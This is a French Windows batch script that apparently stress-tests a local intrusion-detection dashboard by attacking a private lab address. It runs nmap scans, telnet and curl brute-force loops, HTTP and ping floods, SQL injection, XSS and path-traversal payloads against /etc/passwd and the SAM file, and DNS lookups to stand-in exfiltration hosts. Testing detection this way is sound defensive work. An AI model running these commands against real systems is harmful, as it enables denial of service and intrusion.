@echo off
title CyberGuard AI - Suite d'Attaques Intensives
color 0C
mode con: cols=100 lines=40

echo ===============================================================================
echo                    🚨 CYBERGUARD AI - SUITE D'ATTAQUES INTENSIVES 🚨
echo ===============================================================================
echo.
echo Cible WSL2: 172.23.73.174
echo Dashboard: http://172.23.73.174:5000
echo.
echo ⚠️  ATTENTION: Ce script va générer un trafic réseau intensif
echo    Assurez-vous que CyberGuard AI est démarré en mode capture réelle
echo.
pause

cls
echo ===============================================================================
echo                              DÉMARRAGE DES ATTAQUES
echo ===============================================================================

REM === PHASE 1: RECONNAISSANCE ===
echo.
echo [PHASE 1/6] 🔍 RECONNAISSANCE INTENSIVE
echo ===============================================================================
echo [1.1] Découverte d'hôte...
ping -n 5 172.23.73.174

echo [1.2] Scan de ports rapide...
"C:\Program Files (x86)\Nmap\nmap.exe" -sS -F 172.23.73.174

echo [1.3] Détection de services...
"C:\Program Files (x86)\Nmap\nmap.exe" -sV -p 22,80,443,5000 172.23.73.174

echo [1.4] Scan OS fingerprinting...
"C:\Program Files (x86)\Nmap\nmap.exe" -O 172.23.73.174

timeout /t 3 >nul

REM === PHASE 2: PORT SCANNING INTENSIF ===
echo.
echo [PHASE 2/6] 🔍 PORT SCANNING INTENSIF
echo ===============================================================================
echo [2.1] Scan TCP complet...
"C:\Program Files (x86)\Nmap\nmap.exe" -sS -p 1-1000 -T4 172.23.73.174

echo [2.2] Scan UDP ciblé...
"C:\Program Files (x86)\Nmap\nmap.exe" -sU -p 53,161,500,1434 172.23.73.174

echo [2.3] Scan furtif avec fragmentation...
"C:\Program Files (x86)\Nmap\nmap.exe" -sS -f -T2 -p 1-500 172.23.73.174

echo [2.4] Scan agressif avec scripts...
"C:\Program Files (x86)\Nmap\nmap.exe" -A -T4 -p 1-100 172.23.73.174

timeout /t 2 >nul

REM === PHASE 3: BRUTE FORCE ATTACKS ===
echo.
echo [PHASE 3/6] 🔨 ATTAQUES BRUTE FORCE
echo ===============================================================================
echo [3.1] Simulation SSH Brute Force...
for /L %%i in (1,1,50) do (
    echo Tentative SSH %%i/50
    telnet 172.23.73.174 22 2>nul
    timeout /t 0 >nul
)

echo [3.2] Simulation FTP Brute Force...
for /L %%i in (1,1,30) do (
    echo Tentative FTP %%i/30
    telnet 172.23.73.174 21 2>nul
    timeout /t 0 >nul
)

echo [3.3] Simulation HTTP Auth Brute Force...
for /L %%i in (1,1,40) do (
    curl -s -u admin:password%%i http://172.23.73.174:5000/admin 2>nul
)

timeout /t 2 >nul

REM === PHASE 4: DDOS SIMULATION ===
echo.
echo [PHASE 4/6] 💥 SIMULATION DDOS
echo ===============================================================================
echo [4.1] HTTP Flood Attack...
start /min cmd /c "for /L %%i in (1,1,200) do curl -s http://172.23.73.174:5000 >nul 2>&1"
start /min cmd /c "for /L %%i in (1,1,200) do curl -s http://172.23.73.174:5000 >nul 2>&1"
start /min cmd /c "for /L %%i in (1,1,200) do curl -s http://172.23.73.174:5000 >nul 2>&1"

echo [4.2] TCP SYN Flood Simulation...
for /L %%i in (1,1,100) do (
    start /min telnet 172.23.73.174 5000 2>nul
)

echo [4.3] Ping Flood...
start /min ping -t -l 65500 172.23.73.174

echo [4.4] Connexions multiples simultanées...
for /L %%i in (1,1,50) do (
    start /min cmd /c "telnet 172.23.73.174 80 2>nul"
)

timeout /t 5 >nul

REM === PHASE 5: WEB ATTACKS ===
echo.
echo [PHASE 5/6] 🌐 ATTAQUES WEB
echo ===============================================================================
echo [5.1] SQL Injection Attempts...
curl -s "http://172.23.73.174:5000/?id=1' OR '1'='1" >nul
curl -s "http://172.23.73.174:5000/?id=1; DROP TABLE users--" >nul
curl -s "http://172.23.73.174:5000/?id=1 UNION SELECT * FROM passwords" >nul

echo [5.2] XSS Attempts...
curl -s "http://172.23.73.174:5000/?search=<script>alert('XSS')</script>" >nul
curl -s "http://172.23.73.174:5000/?name=<img src=x onerror=alert(1)>" >nul

echo [5.3] Directory Traversal...
curl -s "http://172.23.73.174:5000/../../../etc/passwd" >nul
curl -s "http://172.23.73.174:5000/../../../../windows/system32/config/sam" >nul

echo [5.4] HTTP Method Attacks...
curl -X DELETE http://172.23.73.174:5000/ >nul
curl -X PUT http://172.23.73.174:5000/ >nul
curl -X TRACE http://172.23.73.174:5000/ >nul

timeout /t 2 >nul

REM === PHASE 6: ADVANCED PERSISTENT THREATS ===
echo.
echo [PHASE 6/6] 🎯 MENACES PERSISTANTES AVANCÉES
echo ===============================================================================
echo [6.1] Slow HTTP Attack (Slowloris)...
for /L %%i in (1,1,20) do (
    start /min cmd /c "curl -H 'Connection: keep-alive' -m 30 http://172.23.73.174:5000 2>nul"
)

echo [6.2] DNS Tunneling Simulation...
nslookup malicious.example.com 172.23.73.174 2>nul
nslookup data.exfiltration.evil.com 172.23.73.174 2>nul

echo [6.3] Covert Channel Communication...
for /L %%i in (1,1,15) do (
    ping -n 1 -l %%i 172.23.73.174 >nul
)

echo [6.4] Steganography Traffic...
curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" http://172.23.73.174:5000 >nul

timeout /t 3 >nul

echo.
echo ===============================================================================
echo                              ATTAQUES TERMINÉES
echo ===============================================================================
echo.
echo ✅ Suite d'attaques intensives terminée!
echo.
echo 📊 Vérifiez maintenant votre dashboard CyberGuard AI:
echo    http://172.23.73.174:5000
echo.
echo 📈 Métriques attendues:
echo    - Paquets analysés: Plusieurs milliers
echo    - Anomalies détectées: 50-200+
echo    - Alertes générées: 20-100+
echo    - Types d'attaques: Port Scan, DDoS, Brute Force, Web Attacks
echo.
echo 🔍 Vérifiez la page Alertes pour les détails:
echo    http://172.23.73.174:5000/alerts
echo.
pause

REM === NETTOYAGE ===
echo.
echo [NETTOYAGE] Arrêt des processus d'attaque...
taskkill /f /im telnet.exe 2>nul
taskkill /f /im ping.exe 2>nul
taskkill /f /im curl.exe 2>nul

echo.
echo 🎯 Démonstration terminée! Votre CyberGuard AI a été testé intensivement.
pause
